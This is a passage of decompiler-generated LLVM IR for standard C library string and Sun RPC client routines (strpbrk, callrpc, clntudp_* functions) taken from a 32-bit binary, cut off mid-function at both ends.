dec_label_pc_8055491:                             ; preds = %dec_label_pc_8055464, %dec_label_pc_805548d
  %v0_8055494 = phi i32 [ %v0_8055494.pre, %dec_label_pc_8055464 ], [ %v0_805548f, %dec_label_pc_805548d ]
  %v2_8055491 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055491, i32* @ebx, align 4
  store i32 %v0_805543d, i32* @esi, align 4
  store i32 %v0_805543c, i32* @edi, align 4
  ret i32 %v0_8055494

; uselistorder directives
  uselistorder i32 %v8_805546e, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8055491, { 1, 0 }
  uselistorder label %dec_label_pc_805548d, { 1, 0 }
  uselistorder label %dec_label_pc_8055451, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8055499 = load i32, i32* @ebx, align 4
  %v2_80554b025 = load i8, i8* %arg1, align 1
  %v4_80554b229 = icmp eq i8 %v2_80554b025, 0
  br i1 %v4_80554b229, label %dec_label_pc_80554ba, label %dec_label_pc_80554b6.lr.ph

dec_label_pc_80554b6.lr.ph:                       ; preds = %entry
  %v3_80554b026 = zext i8 %v2_80554b025 to i32
  %v5_80554b027 = and i32 %v0_8055499, -256
  %v6_80554b028 = or i32 %v3_80554b026, %v5_80554b027
  %v4_805549e = ptrtoint i8* %arg1 to i32
  %v1_80554a913 = inttoptr i32 %arg2 to i8*
  %v4_80554a9.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80554b6

dec_label_pc_80554a4:                             ; preds = %dec_label_pc_80554b6, %dec_label_pc_80554a8
  %v6_80554a923 = phi i32 [ %v6_80554a9, %dec_label_pc_80554a8 ], [ %v6_80554a917, %dec_label_pc_80554b6 ]
  %v2_80554a922 = phi i8 [ %v2_80554a9, %dec_label_pc_80554a8 ], [ %v2_80554a914, %dec_label_pc_80554b6 ]
  %v0_80554a821 = phi i32 [ %v1_80554a8, %dec_label_pc_80554a8 ], [ %arg2, %dec_label_pc_80554b6 ]
  %v15_80554a4 = icmp eq i8 %v2_80554a922, %v2_80554b033
  br i1 %v15_80554a4, label %dec_label_pc_80554bc, label %dec_label_pc_80554a8

dec_label_pc_80554a8:                             ; preds = %dec_label_pc_80554a4
  %v1_80554a8 = add i32 %v0_80554a821, 1
  %v1_80554a9 = inttoptr i32 %v1_80554a8 to i8*
  %v2_80554a9 = load i8, i8* %v1_80554a9, align 1
  %v3_80554a9 = zext i8 %v2_80554a9 to i32
  %v5_80554a9 = and i32 %v6_80554a923, -256
  %v6_80554a9 = or i32 %v3_80554a9, %v5_80554a9
  %v4_80554ab = icmp eq i8 %v2_80554a9, 0
  %v1_80554ad = icmp eq i1 %v4_80554ab, false
  br i1 %v1_80554ad, label %dec_label_pc_80554a4, label %dec_label_pc_80554af

dec_label_pc_80554af:                             ; preds = %dec_label_pc_80554a8, %dec_label_pc_80554b6
  %v4_80554a9.pre36 = phi i32 [ %v6_80554a917, %dec_label_pc_80554b6 ], [ %v6_80554a9, %dec_label_pc_80554a8 ]
  %v1_80554af = add i32 %v0_80554af31, 1
  %v1_80554b0 = inttoptr i32 %v1_80554af to i8*
  %v2_80554b0 = load i8, i8* %v1_80554b0, align 1
  %v3_80554b0 = zext i8 %v2_80554b0 to i32
  %v5_80554b0 = and i32 %v6_80554b034, -256
  %v6_80554b0 = or i32 %v3_80554b0, %v5_80554b0
  %v4_80554b2 = icmp eq i8 %v2_80554b0, 0
  br i1 %v4_80554b2, label %dec_label_pc_80554ba, label %dec_label_pc_80554b6

dec_label_pc_80554b6:                             ; preds = %dec_label_pc_80554b6.lr.ph, %dec_label_pc_80554af
  %v4_80554a9.pre = phi i32 [ %v4_80554a9.pre.pre, %dec_label_pc_80554b6.lr.ph ], [ %v4_80554a9.pre36, %dec_label_pc_80554af ]
  %v6_80554b034 = phi i32 [ %v6_80554b028, %dec_label_pc_80554b6.lr.ph ], [ %v6_80554b0, %dec_label_pc_80554af ]
  %v2_80554b033 = phi i8 [ %v2_80554b025, %dec_label_pc_80554b6.lr.ph ], [ %v2_80554b0, %dec_label_pc_80554af ]
  %v0_80554af31 = phi i32 [ %v4_805549e, %dec_label_pc_80554b6.lr.ph ], [ %v1_80554af, %dec_label_pc_80554af ]
  %v2_80554a914 = load i8, i8* %v1_80554a913, align 1
  %v3_80554a915 = zext i8 %v2_80554a914 to i32
  %v5_80554a916 = and i32 %v4_80554a9.pre, -256
  %v6_80554a917 = or i32 %v3_80554a915, %v5_80554a916
  %v4_80554ab18 = icmp eq i8 %v2_80554a914, 0
  %v1_80554ad20 = icmp eq i1 %v4_80554ab18, false
  br i1 %v1_80554ad20, label %dec_label_pc_80554a4, label %dec_label_pc_80554af

dec_label_pc_80554ba:                             ; preds = %dec_label_pc_80554af, %entry
  br label %dec_label_pc_80554bc

dec_label_pc_80554bc:                             ; preds = %dec_label_pc_80554a4, %dec_label_pc_80554ba
  %v0_80554be = phi i32 [ 0, %dec_label_pc_80554ba ], [ %v0_80554af31, %dec_label_pc_80554a4 ]
  store i32 %v0_8055499, i32* @ebx, align 4
  ret i32 %v0_80554be

; uselistorder directives
  uselistorder i8 %v2_80554a914, { 1, 2, 0 }
  uselistorder i32 %v1_80554af, { 1, 0 }
  uselistorder i32 %v6_80554a9, { 1, 0 }
  uselistorder i8 %v2_80554a9, { 1, 2, 0 }
  uselistorder i32 %v1_80554a8, { 1, 0 }
  uselistorder i8 %v2_80554b025, { 0, 2, 1 }
  uselistorder i32 %v0_8055499, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80554bc, { 1, 0 }
  uselistorder label %dec_label_pc_80554b6, { 1, 0 }
  uselistorder label %dec_label_pc_80554af, { 1, 0 }
}

define i32 @__rpc_thread_clnt_cleanup() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80554c0 = load i32, i32* @ebx, align 4
  store i32 %v0_80554c0, i32* %stack_var_-4, align 4
  %v1_80554c4 = call i32 @__rpc_thread_variables(i32 %v0_80554c0)
  %v1_80554c9 = add i32 %v1_80554c4, 164
  %v2_80554c9 = inttoptr i32 %v1_80554c9 to i32*
  %v3_80554c9 = load i32, i32* %v2_80554c9, align 4
  store i32 %v3_80554c9, i32* @ebx, align 4
  %v1_80554cf = icmp eq i32 %v3_80554c9, 0
  br i1 %v1_80554cf, label %dec_label_pc_80554f2, label %dec_label_pc_80554d3

dec_label_pc_80554d3:                             ; preds = %entry
  %v1_80554d3 = inttoptr i32 %v3_80554c9 to i32*
  %v2_80554d3 = load i32, i32* %v1_80554d3, align 4
  %v1_80554d5 = icmp eq i32 %v2_80554d3, 0
  br i1 %v1_80554d5, label %dec_label_pc_80554d3.dec_label_pc_80554e6_crit_edge, label %dec_label_pc_80554d9

dec_label_pc_80554d3.dec_label_pc_80554e6_crit_edge: ; preds = %dec_label_pc_80554d3
  br label %dec_label_pc_80554e6

dec_label_pc_80554d9:                             ; preds = %dec_label_pc_80554d3
  %v1_80554d9 = add i32 %v2_80554d3, 4
  %v2_80554d9 = inttoptr i32 %v1_80554d9 to i32*
  %v3_80554d9 = load i32, i32* %v2_80554d9, align 4
  %v5_80554e0 = add i32 %v3_80554d9, 16
  %v6_80554e0 = inttoptr i32 %v5_80554e0 to i32*
  %v7_80554e0 = load i32, i32* %v6_80554e0, align 4
  call void @__pseudo_call(i32 %v7_80554e0)
  br label %dec_label_pc_80554e6

dec_label_pc_80554e6:                             ; preds = %dec_label_pc_80554d3.dec_label_pc_80554e6_crit_edge, %dec_label_pc_80554d9
  %v1_80554ea = call i32 @free(i32 %v3_80554c9)
  br label %dec_label_pc_80554f2

dec_label_pc_80554f2:                             ; preds = %entry, %dec_label_pc_80554e6
  %v2_80554f2 = load i32, i32* %stack_var_-12, align 4
  %v2_80554f4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80554f4, i32* @ebx, align 4
  ret i32 %v2_80554f2

; uselistorder directives
  uselistorder label %dec_label_pc_80554f2, { 1, 0 }
  uselistorder label %dec_label_pc_80554e6, { 1, 0 }
}

define i32 @callrpc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-1120 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_805551e = call i32 @__rpc_thread_variables(i32 0)
  store i32 %v1_805551e, i32* %eax.global-to-local, align 4
  %v1_8055523 = add i32 %v1_805551e, 164
  %v2_8055523 = inttoptr i32 %v1_8055523 to i32*
  %v3_8055523 = load i32, i32* %v2_8055523, align 4
  store i32 %v3_8055523, i32* @esi, align 4
  store i32 %v1_805551e, i32* @ebx, align 4
  %v1_805552b = icmp eq i32 %v3_8055523, 0
  %v1_805552d = icmp eq i1 %v1_805552b, false
  br i1 %v1_805552d, label %dec_label_pc_805554f, label %dec_label_pc_805552f

dec_label_pc_805552f:                             ; preds = %entry
  %v5_8055535 = call i32 @calloc(i64 1, i32 24, i32 %v1_805551e, i32 %v1_805551e)
  store i32 %v5_8055535, i32* @esi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8055541 = icmp eq i32 %v5_8055535, 0
  br i1 %v1_8055541, label %dec_label_pc_8055700, label %dec_label_pc_8055549

dec_label_pc_8055549:                             ; preds = %dec_label_pc_805552f
  %v1_8055549 = load i32, i32* @ebx, align 4
  %v2_8055549 = add i32 %v1_8055549, 164
  %v3_8055549 = inttoptr i32 %v2_8055549 to i32*
  store i32 %v5_8055535, i32* %v3_8055549, align 4
  %v0_805554f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805554f

dec_label_pc_805554f:                             ; preds = %entry, %dec_label_pc_8055549
  %v0_805554f = phi i32 [ %v3_8055523, %entry ], [ %v0_805554f.pre, %dec_label_pc_8055549 ]
  %v1_805554f = add i32 %v0_805554f, 20
  %v2_805554f = inttoptr i32 %v1_805554f to i32*
  %v3_805554f = load i32, i32* %v2_805554f, align 4
  %v4_805554f = icmp eq i32 %v3_805554f, 0
  %v1_8055553 = icmp eq i1 %v4_805554f, false
  br i1 %v1_8055553, label %dec_label_pc_8055572, label %dec_label_pc_8055555

dec_label_pc_8055555:                             ; preds = %dec_label_pc_805554f
  %v1_805555d = call i32 @malloc(i32 256)
  %v2_805555d = inttoptr i32 %v1_805555d to i8*
  store i32 %v1_805555d, i32* %eax.global-to-local, align 4
  %v2_8055565 = load i32, i32* @esi, align 4
  %v3_8055565 = add i32 %v2_8055565, 20
  %v4_8055565 = inttoptr i32 %v3_8055565 to i32*
  store i32 %v1_805555d, i32* %v4_8055565, align 4
  store i8 0, i8* %v2_805555d, align 1
  %v0_805556b = load i32, i32* @esi, align 4
  %v1_805556b = add i32 %v0_805556b, 4
  %v2_805556b = inttoptr i32 %v1_805556b to i32*
  store i32 -1, i32* %v2_805556b, align 4
  %v0_8055572.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8055572

dec_label_pc_8055572:                             ; preds = %dec_label_pc_805554f, %dec_label_pc_8055555
  %v0_805558a = phi i32 [ %v0_805554f, %dec_label_pc_805554f ], [ %v0_8055572.pre, %dec_label_pc_8055555 ]
  %v1_8055572 = add i32 %v0_805558a, 16
  %v2_8055572 = inttoptr i32 %v1_8055572 to i32*
  %v3_8055572 = load i32, i32* %v2_8055572, align 4
  %v4_8055572 = icmp eq i32 %v3_8055572, 0
  br i1 %v4_8055572, label %dec_label_pc_805559d, label %dec_label_pc_8055578

dec_label_pc_8055578:                             ; preds = %dec_label_pc_8055572
  %v1_8055578 = add i32 %v0_805558a, 8
  %v2_8055578 = inttoptr i32 %v1_8055578 to i32*
  %v3_8055578 = load i32, i32* %v2_8055578, align 4
  %v4_8055578 = load i32, i32* @edi, align 4
  %v15_8055578 = icmp eq i32 %v3_8055578, %v4_8055578
  %v1_805557b = icmp eq i1 %v15_8055578, false
  br i1 %v1_805557b, label %dec_label_pc_805559d, label %dec_label_pc_805557d

dec_label_pc_805557d:                             ; preds = %dec_label_pc_8055578
  store i32 %arg3, i32* @eax, align 4
  %v1_8055580 = add i32 %v0_805558a, 12
  %v2_8055580 = inttoptr i32 %v1_8055580 to i32*
  %v3_8055580 = load i32, i32* %v2_8055580, align 4
  %v15_8055580 = icmp eq i32 %v3_8055580, %arg3
  %v1_8055583 = icmp eq i1 %v15_8055580, false
  br i1 %v1_8055583, label %dec_label_pc_805559d, label %dec_label_pc_8055585

dec_label_pc_8055585:                             ; preds = %dec_label_pc_805557d
  %v1_805558a = add i32 %v0_805558a, 20
  %v2_805558a = inttoptr i32 %v1_805558a to i32*
  %v3_805558a = load i32, i32* %v2_805558a, align 4
  %v4_805558d = inttoptr i32 %v3_805558a to i8*
  %v5_805558d = call i32 @__GI_strcoll(i8* %v4_805558d, i32 %arg1, i32 %arg3, i32 %arg3)
  store i32 %v5_805558d, i32* %eax.global-to-local, align 4
  %v1_8055595 = icmp eq i32 %v5_805558d, 0
  br i1 %v1_8055595, label %dec_label_pc_80556c0, label %dec_label_pc_8055585.dec_label_pc_805559d_crit_edge

dec_label_pc_8055585.dec_label_pc_805559d_crit_edge: ; preds = %dec_label_pc_8055585
  %v0_805559d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805559d

dec_label_pc_805559d:                             ; preds = %dec_label_pc_8055585.dec_label_pc_805559d_crit_edge, %dec_label_pc_805557d, %dec_label_pc_8055578, %dec_label_pc_8055572
  %v0_805559d = phi i32 [ %v0_805559d.pre, %dec_label_pc_8055585.dec_label_pc_805559d_crit_edge ], [ %v0_805558a, %dec_label_pc_805557d ], [ %v0_805558a, %dec_label_pc_8055578 ], [ %v0_805558a, %dec_label_pc_8055572 ]
  %v1_805559d = add i32 %v0_805559d, 4
  %v2_805559d = inttoptr i32 %v1_805559d to i32*
  %v3_805559d = load i32, i32* %v2_805559d, align 4
  store i32 %v3_805559d, i32* %eax.global-to-local, align 4
  %v1_80555a0 = add i32 %v0_805559d, 16
  %v2_80555a0 = inttoptr i32 %v1_80555a0 to i32*
  store i32 0, i32* %v2_80555a0, align 4
  %v0_80555a7 = load i32, i32* %eax.global-to-local, align 4
  %v10_80555a7 = icmp eq i32 %v0_80555a7, -1
  br i1 %v10_80555a7, label %dec_label_pc_80555bf, label %dec_label_pc_80555ac

dec_label_pc_80555ac:                             ; preds = %dec_label_pc_805559d
  %v1_80555b0 = call i32 @__libc_close(i32 %v0_80555a7)
  store i32 %v1_80555b0, i32* %eax.global-to-local, align 4
  %v0_80555b8 = load i32, i32* @esi, align 4
  %v1_80555b8 = add i32 %v0_80555b8, 4
  %v2_80555b8 = inttoptr i32 %v1_80555b8 to i32*
  store i32 -1, i32* %v2_80555b8, align 4
  br label %dec_label_pc_80555bf

dec_label_pc_80555bf:                             ; preds = %dec_label_pc_805559d, %dec_label_pc_80555ac
  %v0_80555bf = load i32, i32* @esi, align 4
  %v1_80555bf = inttoptr i32 %v0_80555bf to i32*
  %v2_80555bf = load i32, i32* %v1_80555bf, align 4
  %v1_80555c1 = icmp eq i32 %v2_80555bf, 0
  br i1 %v1_80555c1, label %dec_label_pc_80555d8, label %dec_label_pc_80555c5

dec_label_pc_80555c5:                             ; preds = %dec_label_pc_80555bf
  %v1_80555c5 = add i32 %v2_80555bf, 4
  %v2_80555c5 = inttoptr i32 %v1_80555c5 to i32*
  %v3_80555c5 = load i32, i32* %v2_80555c5, align 4
  store i32 %v3_80555c5, i32* %eax.global-to-local, align 4
  store i32 134567375, i32* %stack_var_-112, align 4
  %v5_80555cc = add i32 %v3_80555c5, 16
  %v6_80555cc = inttoptr i32 %v5_80555cc to i32*
  %v7_80555cc = load i32, i32* %v6_80555cc, align 4
  call void @__pseudo_call(i32 %v7_80555cc)
  %v0_80555d2 = load i32, i32* @esi, align 4
  %v1_80555d2 = inttoptr i32 %v0_80555d2 to i32*
  store i32 0, i32* %v1_80555d2, align 4
  br label %dec_label_pc_80555d8

dec_label_pc_80555d8:                             ; preds = %dec_label_pc_80555bf, %dec_label_pc_80555c5
  store i32 1024, i32* @ebx, align 4
  %v8_80555e7 = ptrtoint i32* %stack_var_-1120 to i32
  %v2_8055617 = ptrtoint i32* %stack_var_-28 to i32
  %v2_805561b = ptrtoint i32* %stack_var_-24 to i32
  %v2_8055621 = ptrtoint i32* %stack_var_-64 to i32
  %v0_8055615.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055615

dec_label_pc_80555ec:                             ; preds = %dec_label_pc_8055634, %dec_label_pc_8055615
  %v3_80555ec = load i32, i32* %stack_var_-28, align 4
  %v13_80555ec = icmp eq i32 %v3_80555ec, -1
  %v1_80555f0 = icmp eq i1 %v13_80555ec, false
  br i1 %v1_80555f0, label %dec_label_pc_80556fb, label %dec_label_pc_80555f6

dec_label_pc_80555f6:                             ; preds = %dec_label_pc_80555ec
  %v0_80555f6 = load i32, i32* %stack_var_-112, align 4
  %v1_80555f6 = call i32 @__errno_location(i32 %v0_80555f6)
  store i32 %v1_80555f6, i32* %eax.global-to-local, align 4
  %v1_80555fb = inttoptr i32 %v1_80555f6 to i32*
  %v2_80555fb = load i32, i32* %v1_80555fb, align 4
  %v11_80555fb = icmp eq i32 %v2_80555fb, 34
  %v1_80555fe = icmp eq i1 %v11_80555fb, false
  br i1 %v1_80555fe, label %dec_label_pc_80556fb, label %dec_label_pc_8055604

dec_label_pc_8055604:                             ; preds = %dec_label_pc_80555f6
  %v0_8055604 = load i32, i32* @ebx, align 4
  %v2_8055604 = mul i32 %v0_8055604, 2
  store i32 %v2_8055604, i32* @ebx, align 4
  %v1_8055606 = add i32 %v2_8055604, 30
  %v1_8055609 = and i32 %v1_8055606, -16
  store i32 %v1_8055609, i32* %eax.global-to-local, align 4
  %v0_805560c = load i32, i32* @esp, align 4
  %v2_805560c = sub i32 %v0_805560c, %v1_8055609
  %v1_805560e = add i32 %v2_805560c, 15
  %v1_8055612 = and i32 %v1_805560e, -16
  br label %dec_label_pc_8055615

dec_label_pc_8055615:                             ; preds = %dec_label_pc_80555d8, %dec_label_pc_8055604
  %v0_805561f = phi i32 [ 1024, %dec_label_pc_80555d8 ], [ %v2_8055604, %dec_label_pc_8055604 ]
  %v0_8055615 = phi i32 [ %v0_8055615.pre, %dec_label_pc_80555d8 ], [ %v1_8055609, %dec_label_pc_8055604 ]
  %storemerge = phi i32 [ %v8_80555e7, %dec_label_pc_80555d8 ], [ %v1_8055612, %dec_label_pc_8055604 ]
  store i32 %v2_8055621, i32* %eax.global-to-local, align 4
  %v9_8055628 = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull %stack_var_-64, i32 %storemerge, i32 %v0_805561f, i32 %v2_805561b, i32 %v2_8055617, i32 %v0_8055615, i32 %v0_8055615)
  store i32 %v9_8055628, i32* %eax.global-to-local, align 4
  %v1_8055630 = icmp eq i32 %v9_8055628, 0
  %v1_8055632 = icmp eq i1 %v1_8055630, false
  br i1 %v1_8055632, label %dec_label_pc_80555ec, label %dec_label_pc_8055634

dec_label_pc_8055634:                             ; preds = %dec_label_pc_8055615
  %v3_8055634 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_8055634, i32* %eax.global-to-local, align 4
  %v1_8055637 = icmp eq i32 %v3_8055634, 0
  br i1 %v1_8055637, label %dec_label_pc_80555ec, label %dec_label_pc_805563b

dec_label_pc_805563b:                             ; preds = %dec_label_pc_8055634
  %v2_8055646 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8055646, i32* @ebx, align 4
  %v1_8055650 = add i32 %v3_8055634, 12
  %v2_8055650 = inttoptr i32 %v1_8055650 to i32*
  %v3_8055650 = load i32, i32* %v2_8055650, align 4
  %v1_8055653 = add i32 %v3_8055634, 16
  %v2_8055653 = inttoptr i32 %v1_8055653 to i32*
  %v3_8055653 = load i32, i32* %v2_8055653, align 4
  store i32 %v3_8055653, i32* %eax.global-to-local, align 4
  %v1_8055656 = inttoptr i32 %v3_8055653 to i32*
  %v2_8055656 = load i32, i32* %v1_8055656, align 4
  %v3_8055659 = bitcast i32* %stack_var_-40 to i16*
  %v4_8055659 = call i32 @memcpy(i16* %v3_8055659, i32 %v2_8055656, i32 %v3_8055650)
  %v0_805565f = load i32, i32* @esi, align 4
  %v1_805565f = add i32 %v0_805565f, 4
  store i32 %v1_805565f, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v0_8055679 = load i32, i32* @edi, align 4
  %v6_805567b = call i32 @__GI_clntudp_create(i32 %v2_8055646, i32 %v0_8055679, i32 %arg3, i32 5, i32 0, i32 %v1_805565f)
  store i32 %v6_805567b, i32* %eax.global-to-local, align 4
  %v1_8055683 = icmp eq i32 %v6_805567b, 0
  %v1_8055685 = load i32, i32* @esi, align 4
  %v2_8055685 = inttoptr i32 %v1_8055685 to i32*
  store i32 %v6_805567b, i32* %v2_8055685, align 4
  %v1_8055687 = icmp eq i1 %v1_8055683, false
  br i1 %v1_8055687, label %dec_label_pc_8055692, label %dec_label_pc_8055689

dec_label_pc_8055689:                             ; preds = %dec_label_pc_805563b
  %v0_8055689 = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_8055689, i32* %eax.global-to-local, align 4
  %v1_805568e = inttoptr i32 %v0_8055689 to i32*
  %v2_805568e = load i32, i32* %v1_805568e, align 4
  store i32 %v2_805568e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055700

dec_label_pc_8055692:                             ; preds = %dec_label_pc_805563b
  %v0_8055692 = load i32, i32* @esi, align 4
  %v1_8055692 = add i32 %v0_8055692, 16
  %v2_8055692 = inttoptr i32 %v1_8055692 to i32*
  store i32 1, i32* %v2_8055692, align 4
  %v0_8055699 = load i32, i32* @edi, align 4
  %v1_8055699 = load i32, i32* @esi, align 4
  %v2_8055699 = add i32 %v1_8055699, 8
  %v3_8055699 = inttoptr i32 %v2_8055699 to i32*
  store i32 %v0_8055699, i32* %v3_8055699, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v1_805569f = load i32, i32* @esi, align 4
  %v2_805569f = add i32 %v1_805569f, 12
  %v3_805569f = inttoptr i32 %v2_805569f to i32*
  store i32 %arg3, i32* %v3_805569f, align 4
  %v0_80556ab = load i32, i32* @esi, align 4
  %v1_80556ab = add i32 %v0_80556ab, 20
  %v2_80556ab = inttoptr i32 %v1_80556ab to i32*
  %v3_80556ab = load i32, i32* %v2_80556ab, align 4
  %v3_80556ae = inttoptr i32 %v3_80556ab to i8*
  %v4_80556ae = call i32 @strncpy(i8* %v3_80556ae, i32 %arg1, i32 255)
  store i32 %v4_80556ae, i32* %eax.global-to-local, align 4
  %v0_80556b3 = load i32, i32* @esi, align 4
  %v1_80556b3 = add i32 %v0_80556b3, 20
  %v2_80556b3 = inttoptr i32 %v1_80556b3 to i32*
  %v3_80556b3 = load i32, i32* %v2_80556b3, align 4
  store i32 %v3_80556b3, i32* %eax.global-to-local, align 4
  %v1_80556b9 = add i32 %v3_80556b3, 255
  %v2_80556b9 = inttoptr i32 %v1_80556b9 to i8*
  store i8 0, i8* %v2_80556b9, align 1
  br label %dec_label_pc_80556c0

dec_label_pc_80556c0:                             ; preds = %dec_label_pc_8055585, %dec_label_pc_8055692
  %v0_80556ce = load i32, i32* @esi, align 4
  %v1_80556ce = inttoptr i32 %v0_80556ce to i32*
  %v2_80556ce = load i32, i32* %v1_80556ce, align 4
  store i32 %v2_80556ce, i32* %eax.global-to-local, align 4
  %v1_80556d0 = add i32 %v2_80556ce, 4
  %v2_80556d0 = inttoptr i32 %v1_80556d0 to i32*
  %v3_80556d0 = load i32, i32* %v2_80556d0, align 4
  store i32 %arg6, i32* %stack_var_-112, align 4
  %v5_80556e9 = inttoptr i32 %v3_80556d0 to i32*
  %v6_80556e9 = load i32, i32* %v5_80556e9, align 4
  call void @__pseudo_call(i32 %v6_80556e9)
  %v0_80556ee = load i32, i32* %eax.global-to-local, align 4
  %v1_80556ee = icmp eq i32 %v0_80556ee, 0
  br i1 %v1_80556ee, label %dec_label_pc_8055700, label %dec_label_pc_80556f2

dec_label_pc_80556f2:                             ; preds = %dec_label_pc_80556c0
  %v0_80556f2 = load i32, i32* @esi, align 4
  %v1_80556f2 = add i32 %v0_80556f2, 16
  %v2_80556f2 = inttoptr i32 %v1_80556f2 to i32*
  store i32 0, i32* %v2_80556f2, align 4
  %v0_8055707.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055700

dec_label_pc_80556fb:                             ; preds = %dec_label_pc_80555f6, %dec_label_pc_80555ec
  store i32 13, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055700

dec_label_pc_8055700:                             ; preds = %dec_label_pc_80556c0, %dec_label_pc_805552f, %dec_label_pc_80556f2, %dec_label_pc_8055689, %dec_label_pc_80556fb
  %v0_8055707 = phi i32 [ 0, %dec_label_pc_80556c0 ], [ 0, %dec_label_pc_805552f ], [ %v0_8055707.pre, %dec_label_pc_80556f2 ], [ %v2_805568e, %dec_label_pc_8055689 ], [ 13, %dec_label_pc_80556fb ]
  ret i32 %v0_8055707

; uselistorder directives
  uselistorder i32 %v2_8055604, { 2, 1, 0 }
  uselistorder i32 %v0_80555a7, { 1, 0 }
  uselistorder i32 %v0_805559d, { 1, 0 }
  uselistorder i32 %v1_805555d, { 0, 2, 1 }
  uselistorder i32* %stack_var_-112, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 16, 13, 14, 19, 17, 18, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 30, { 2, 1, 0 }
  uselistorder i32 %arg3, { 6, 5, 1, 2, 3, 0, 4 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8055700, { 4, 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_80556c0, { 1, 0 }
  uselistorder label %dec_label_pc_8055615, { 1, 0 }
  uselistorder label %dec_label_pc_80555d8, { 1, 0 }
  uselistorder label %dec_label_pc_80555bf, { 1, 0 }
  uselistorder label %dec_label_pc_8055572, { 1, 0 }
  uselistorder label %dec_label_pc_805554f, { 1, 0 }
}

define i32 @clntudp_geterr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_805570f = add i32 %arg1, 8
  %v2_805570f = inttoptr i32 %v1_805570f to i32*
  %v3_805570f = load i32, i32* %v2_805570f, align 4
  %v1_8055714 = add i32 %v3_805570f, 44
  %v3_805571c = inttoptr i32 %arg2 to i16*
  %v4_805571c = call i32 @memcpy(i16* %v3_805571c, i32 %v1_8055714, i32 12)
  ret i32 %v4_805571c
}

define i32 @clntudp_freeres(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_8055731 = add i32 %arg1, 8
  %v2_8055731 = inttoptr i32 %v1_8055731 to i32*
  %v3_8055731 = load i32, i32* %v2_8055731, align 4
  %v1_8055734 = add i32 %v3_8055731, 56
  %v1_8055737 = inttoptr i32 %v1_8055734 to i32*
  store i32 2, i32* %v1_8055737, align 4
  call void @__pseudo_branch(i32 %arg2)
  ret i32 %v1_8055734
}

define i32 @clntudp_abort() local_unnamed_addr {
entry:
  %v0_8055747 = load i32, i32* @eax, align 4
  ret i32 %v0_8055747
}

define i32 @clntudp_control(i32 %arg1, i32 %arg2, i32* %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg3 to i32
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* %ebx.global-to-local, align 4
  %v1_8055754 = add i32 %arg1, 8
  %v2_8055754 = inttoptr i32 %v1_8055754 to i32*
  %v3_8055754 = load i32, i32* %v2_8055754, align 4
  store i32 %v3_8055754, i32* %ecx.global-to-local, align 4
  %v1_805575b = add i32 %arg2, -1
  store i32 %v1_805575b, i32* %eax.global-to-local, align 4
  switch i32 %arg2, label %dec_label_pc_8055768 [
    i32 1, label %dec_label_pc_8055787
    i32 2, label %dec_label_pc_8055794
    i32 3, label %dec_label_pc_80557b6
    i32 4, label %dec_label_pc_805579c
    i32 5, label %dec_label_pc_80557a9
    i32 6, label %dec_label_pc_80557cd
    i32 8, label %dec_label_pc_805576f
    i32 9, label %dec_label_pc_805577b
    i32 10, label %dec_label_pc_80557d1
    i32 11, label %dec_label_pc_80557da
    i32 12, label %dec_label_pc_80557e4
    i32 13, label %dec_label_pc_80557ee
    i32 14, label %dec_label_pc_80557fa
    i32 15, label %dec_label_pc_8055806
  ]

dec_label_pc_8055768:                             ; preds = %entry
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055815

dec_label_pc_805576f:                             ; preds = %entry
  %v1_805576f = add i32 %v3_8055754, 4
  %v2_805576f = inttoptr i32 %v1_805576f to i32*
  store i32 1, i32* %v2_805576f, align 4
  br label %dec_label_pc_8055810

dec_label_pc_805577b:                             ; preds = %entry
  %v1_805577b = add i32 %v3_8055754, 4
  %v2_805577b = inttoptr i32 %v1_805577b to i32*
